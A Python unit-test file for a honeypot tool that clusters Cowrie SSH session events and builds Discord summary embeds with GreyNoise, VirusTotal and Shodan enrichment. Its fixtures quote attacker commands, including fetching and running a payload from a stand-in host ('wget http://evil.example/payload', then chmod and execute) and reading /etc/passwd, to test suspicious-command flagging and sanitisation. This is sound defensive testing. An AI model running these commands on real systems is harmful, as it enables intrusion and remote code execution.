"""Deterministic tests for session/IP clustering (Design Requirements 5 & 6)."""

import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "native"))

from session_cluster import (  # noqa: E402
    MAX_NOTABLE_COMMANDS,
    SessionClusterManager,
    build_session_summary_payload,
    sanitize_display,
)


def _event(eventid, **fields):
    payload = {"eventid": eventid, "src_ip": "198.51.100.7", "session": "sess-1", "timestamp": "2026-01-01T00:00:00Z"}
    payload.update(fields)
    return payload


class ClusteringTests(unittest.TestCase):
    def test_first_event_creates_new_cluster(self):
        manager = SessionClusterManager(window_seconds=45.0)
        key, cluster, is_new = manager.observe(_event("cowrie.session.connect"), now=0.0)
        self.assertTrue(is_new)
        self.assertEqual(cluster.raw_event_count, 1)
        self.assertEqual(key, "session:sess-1")

    def test_subsequent_events_accumulate_into_same_cluster(self):
        manager = SessionClusterManager(window_seconds=45.0)
        manager.observe(_event("cowrie.session.connect"), now=0.0)
        manager.observe(_event("cowrie.login.success", username="root", password="admin"), now=1.0)
        _key, cluster, is_new = manager.observe(_event("cowrie.command.input", input="uname -a"), now=2.0)
        self.assertFalse(is_new)
        self.assertEqual(cluster.raw_event_count, 3)
        self.assertTrue(cluster.authenticated)
        self.assertEqual(cluster.username, "root")
        self.assertEqual(cluster.commands, ["uname -a"])

    def test_eight_raw_events_produce_one_cluster_not_eight(self):
        manager = SessionClusterManager(window_seconds=45.0)
        events = [
            _event("cowrie.session.connect"),
            _event("cowrie.login.success", username="root", password="admin"),
            _event("cowrie.command.input", input="uname -a"),
            _event("cowrie.command.input", input="id"),
            _event("cowrie.command.input", input="cat /etc/passwd"),
            _event("cowrie.command.input", input="wget http://evil.example/payload"),
            _event("cowrie.command.input", input="chmod +x payload"),
            _event("cowrie.command.input", input="./payload"),
        ]
        keys = {manager.observe(event, now=float(i))[0] for i, event in enumerate(events)}
        self.assertEqual(len(keys), 1)
        self.assertEqual(manager.active_count(), 1)

    def test_suspicious_commands_are_flagged(self):
        manager = SessionClusterManager(window_seconds=45.0)
        manager.observe(_event("cowrie.command.input", input="wget http://evil.example/payload"), now=0.0)
        _key, cluster, _is_new = manager.observe(_event("cowrie.command.input", input="ls"), now=1.0)
        self.assertIn("wget http://evil.example/payload", cluster.suspicious_commands)
        self.assertNotIn("ls", cluster.suspicious_commands)

    def test_window_expiry_flushes_cluster(self):
        manager = SessionClusterManager(window_seconds=45.0)
        manager.observe(_event("cowrie.session.connect"), now=0.0)
        self.assertEqual(len(manager.flush_expired(now=10.0)), 0)
        expired = manager.flush_expired(now=50.0)
        self.assertEqual(len(expired), 1)
        self.assertEqual(manager.active_count(), 0)

    def test_max_cluster_age_forces_flush_even_with_activity(self):
        manager = SessionClusterManager(window_seconds=45.0, max_cluster_age_seconds=100.0)
        manager.observe(_event("cowrie.session.connect"), now=0.0)
        manager.observe(_event("cowrie.command.input", input="ls"), now=90.0)
        expired = manager.flush_expired(now=105.0)
        self.assertEqual(len(expired), 1)

    def test_ip_fallback_clustering_reuses_within_window(self):
        manager = SessionClusterManager(window_seconds=30.0)
        no_session = {"eventid": "cowrie.command.input", "src_ip": "198.51.100.7", "input": "ls"}
        key1, _cluster1, is_new1 = manager.observe(no_session, now=0.0)
        key2, cluster2, is_new2 = manager.observe(dict(no_session), now=5.0)
        self.assertTrue(is_new1)
        self.assertFalse(is_new2)
        self.assertEqual(key1, key2)
        self.assertEqual(cluster2.raw_event_count, 2)

    def test_ip_fallback_clustering_starts_new_after_window(self):
        manager = SessionClusterManager(window_seconds=30.0)
        no_session = {"eventid": "cowrie.command.input", "src_ip": "198.51.100.7", "input": "ls"}
        manager.observe(no_session, now=0.0)
        _key, cluster, is_new = manager.observe(dict(no_session), now=100.0)
        self.assertTrue(is_new)
        self.assertEqual(cluster.raw_event_count, 1)

    def test_priority_event_detection(self):
        manager = SessionClusterManager()
        _key, cluster, _is_new = manager.observe(_event("cowrie.login.success"), now=0.0)
        self.assertTrue(cluster.is_priority_event(_event("cowrie.login.success")))
        self.assertTrue(cluster.is_priority_event(_event("cowrie.session.file_download")))
        self.assertFalse(cluster.is_priority_event(_event("cowrie.command.input")))

    def test_command_count_and_notable_commands_bounded(self):
        manager = SessionClusterManager(max_commands=5)
        for i in range(20):
            manager.observe(_event("cowrie.command.input", input=f"wget http://x/{i}"), now=float(i))
        _key, cluster, _is_new = manager.observe(_event("cowrie.command.input", input="final"), now=21.0)
        self.assertLessEqual(len(cluster.commands), 5)
        self.assertLessEqual(len(cluster.suspicious_commands), MAX_NOTABLE_COMMANDS)

    def test_long_command_is_truncated_and_control_chars_stripped(self):
        long_command = "a" * 500 + "\x00\x01"
        display = sanitize_display(long_command)
        self.assertLessEqual(len(display), 120)
        self.assertNotIn("\x00", display)

    def test_backtick_in_command_does_not_break_embed_formatting(self):
        display = sanitize_display("echo `whoami`")
        self.assertNotIn("`", display)


class SummaryPayloadTests(unittest.TestCase):
    def test_summary_payload_is_well_formed(self):
        manager = SessionClusterManager()
        manager.observe(_event("cowrie.login.success", username="root", password="toor"), now=0.0)
        manager.observe(_event("cowrie.command.input", input="cat /etc/passwd"), now=1.0)
        expired = manager.flush_expired(now=1000.0)
        self.assertEqual(len(expired), 1)
        payload = build_session_summary_payload(expired[0], enrichment=None)
        embed = payload["embeds"][0]
        self.assertIn("ATTACK SESSION SUMMARY", embed["title"])
        self.assertLessEqual(len(embed["fields"]), 25)
        for field in embed["fields"]:
            self.assertLessEqual(len(field["value"]), 1024)

    def test_summary_payload_includes_enrichment(self):
        manager = SessionClusterManager()
        manager.observe(_event("cowrie.session.connect"), now=0.0)
        expired = manager.flush_expired(now=1000.0)
        enrichment = {
            "greynoise": {"status": "ok", "normalized": {"classification": "malicious", "actor": "x", "tags": ["a"]}},
            "virustotal": {"status": "ok", "normalized": {"last_analysis_stats": {"malicious": 9, "suspicious": 1}, "asn": 1, "as_owner": "X"}},
            "shodan": {"status": "ok", "normalized": {"org": "X", "ports": [22, 80], "products": ["nginx"], "vulns": []}},
        }
        payload = build_session_summary_payload(expired[0], enrichment)
        fields_by_name = {field["name"]: field["value"] for field in payload["embeds"][0]["fields"]}
        self.assertIn("malicious", fields_by_name["GreyNoise"])
        self.assertIn("9", fields_by_name["VirusTotal"])
        self.assertIn("22,80", fields_by_name["Shodan"])

    def test_summary_payload_handles_unavailable_enrichment(self):
        manager = SessionClusterManager()
        manager.observe(_event("cowrie.session.connect"), now=0.0)
        expired = manager.flush_expired(now=1000.0)
        payload = build_session_summary_payload(expired[0], enrichment=None)
        fields_by_name = {field["name"]: field["value"] for field in payload["embeds"][0]["fields"]}
        self.assertEqual(fields_by_name["GreyNoise"], "unavailable")

    def test_no_successful_login_reflected_in_summary(self):
        manager = SessionClusterManager()
        manager.observe(_event("cowrie.session.connect"), now=0.0)
        expired = manager.flush_expired(now=1000.0)
        payload = build_session_summary_payload(expired[0], enrichment=None)
        fields_by_name = {field["name"]: field["value"] for field in payload["embeds"][0]["fields"]}
        self.assertIn("No successful login", fields_by_name["Authentication"])

    def _embed_total_size(self, embed):
        total = len(embed.get("title", "")) + len(embed.get("description", ""))
        total += len(embed.get("footer", {}).get("text", ""))
        for field in embed.get("fields", []):
            total += len(field.get("name", "")) + len(field.get("value", ""))
        return total

    def test_total_embed_size_stays_under_discord_limit_with_malicious_provider_data(self):
        """Discord's *total* embed character budget is 6000, not just a
        per-field 1024 cap. A provider returning several near-max-length
        fields must not blow the total budget even though each individually
        passes the per-field check."""
        manager = SessionClusterManager()
        manager.observe(_event("cowrie.session.connect"), now=0.0)
        expired = manager.flush_expired(now=1000.0)
        huge_tag_list = [f"tag-{'x' * 50}-{i}" for i in range(50)]
        enrichment = {
            "greynoise": {
                "status": "ok",
                "normalized": {"classification": "x" * 2000, "actor": "y" * 2000, "tags": huge_tag_list},
            },
            "virustotal": {
                "status": "ok",
                "normalized": {"last_analysis_stats": {"malicious": 1, "suspicious": 1}, "asn": "z" * 2000, "as_owner": "w" * 2000},
            },
            "shodan": {
                "status": "ok",
                "normalized": {"org": "q" * 2000, "ports": list(range(500)), "products": ["p" * 200] * 50, "vulns": ["v" * 200] * 50},
            },
        }
        payload = build_session_summary_payload(expired[0], enrichment)
        total = self._embed_total_size(payload["embeds"][0])
        self.assertLessEqual(total, 6000)

    def test_provider_supplied_control_characters_and_backticks_are_stripped(self):
        manager = SessionClusterManager()
        manager.observe(_event("cowrie.session.connect"), now=0.0)
        expired = manager.flush_expired(now=1000.0)
        enrichment = {
            "greynoise": {
                "status": "ok",
                "normalized": {
                    "classification": "malicious\x00\x01`@everyone`",
                    "actor": "actor`with`backticks",
                    "tags": ["tag`one`", "tag\x07two"],
                },
            },
            "virustotal": None,
            "shodan": None,
        }
        payload = build_session_summary_payload(expired[0], enrichment)
        fields_by_name = {field["name"]: field["value"] for field in payload["embeds"][0]["fields"]}
        greynoise_field = fields_by_name["GreyNoise"]
        self.assertNotIn("\x00", greynoise_field)
        self.assertNotIn("\x01", greynoise_field)
        self.assertNotIn("\x07", greynoise_field)
        self.assertNotIn("`", greynoise_field)

    def test_provider_field_individually_bounded_before_total_truncation(self):
        manager = SessionClusterManager()
        manager.observe(_event("cowrie.session.connect"), now=0.0)
        expired = manager.flush_expired(now=1000.0)
        enrichment = {
            "greynoise": {"status": "ok", "normalized": {"classification": "a" * 5000, "actor": "unknown", "tags": []}},
            "virustotal": None,
            "shodan": None,
        }
        payload = build_session_summary_payload(expired[0], enrichment)
        fields_by_name = {field["name"]: field["value"] for field in payload["embeds"][0]["fields"]}
        self.assertLessEqual(len(fields_by_name["GreyNoise"]), 1024)


if __name__ == "__main__":
    unittest.main()
